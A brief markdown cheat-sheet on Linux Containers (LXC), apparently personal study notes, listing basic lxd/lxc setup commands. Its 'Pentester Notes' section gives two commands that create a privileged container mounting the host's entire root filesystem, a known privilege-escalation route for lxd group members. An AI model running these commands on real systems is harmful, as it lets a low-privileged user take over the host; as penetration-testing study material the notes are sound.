# Linux Containers (LXC)

<div class="row row-cols-lg-2"><div>

[Linux Containers](https://linuxcontainers.org/) (LXC) is a Linux only virtualization method to run multiple Linux systems using the host Linux kernel.

[Docker](../docker/index.md) is built over LXC. It provides additional features and a simplified interface. They share the notion of 'image' and 'container'.

LXC can only be used on Linux hosts. Users part of the `lxd` group can call any commands without sudo.
</div><div>

Random commands:

```shell!
$ lxd init
$ lxc launch ubuntu:22.04 container_name
$ lxc image import image.tar.gz --alias image_name
$ lxc init image_name container_name
$ lxc start container_name
$ lxc exec container_name /bin/bash
```
</div></div>

<hr class="sep-both">

## Pentester Notes ☠️

<div class="row row-cols-lg-2"><div>

Create a container mounting the underlying file system.

```
$ lxc init image_name container_name -c security.privileged=true
$ lxc config device add container_name device_name disk source=/ path=/mnt/root recursive=true
```
</div><div>
</div></div>